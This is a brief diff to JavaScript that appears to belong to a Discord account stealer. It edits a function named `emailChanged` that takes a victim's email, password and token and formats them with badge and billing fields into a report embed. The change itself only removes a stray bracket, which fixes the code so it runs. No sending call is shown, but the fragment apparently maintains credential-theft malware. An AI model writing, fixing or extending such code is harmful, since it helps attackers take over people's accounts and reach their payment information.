@@ -506,7 +506,6 @@ const emailChanged = async (email, password, token) => {
             value: `**${badges}**`,
             inline: true,
           },
-            },
            {
             name: "<a:tre:962470727129391134> Billing:",
             value: '' + H(),
